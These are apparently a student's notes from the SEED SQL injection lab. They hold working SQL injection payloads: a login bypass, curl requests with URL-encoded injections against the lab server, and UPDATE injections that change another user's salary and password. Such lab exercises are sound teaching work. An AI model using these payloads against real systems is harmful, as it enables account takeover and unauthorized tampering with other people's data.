# Useful commands

- mysql -u root -pdees

- use sqllab_users;

- show tables;

- SELECT * FROM credential;

# Task 2.1: SQL Injection Attack from webpage.

- username: admin' or '
- password: random

# Task 2.2: SQL Injection Attack from command line.

URL encoding:

- %3D is =

- %27 is '

- %20 is <whitespace>

- %26 is &

- %7C is |

Commands:

- curl 'www.seed-server.com/unsafe_home.php?username=admin%27+or+%27&Password=sdasd'

- curl 'www.seed-server.com/unsafe_home.php?username=admin%27+or+%27&Password=sdasd' > ~/Scaricati/Projects/Ethical-Hacking-22-23/SQL_Injection_Lab-20221129/log.html --libcurl ~/Scaricati/Projects/Ethical-Hacking-22-23/SQL_Injection_Lab-20221129/libcurl code.c

# Task 2.3: Append a new SQL statement.

- username: admin'; UPDATE credential SET salary=0 where name = 'admin'; --

- password: ciao

Previous SQL injection attempt doesn't work since $conn->query($sql) can only send 1 query towards the database, so it's impossible to sends multiple requests separated by semicolon.

# Task 3.1: Modify your own salary.

NickName: Alice', salary = '90000

# Task 3.2: Modify other people’ salary.

NickName: Boby', salary = '1' where nickname = 'Boby';#

# Task 3.3: Modify other people’ password.

NickName: Boby', Password='1e4e888ac66f8dd41e00c5a7ac36a32a9950d271' where nickname = 'Boby';#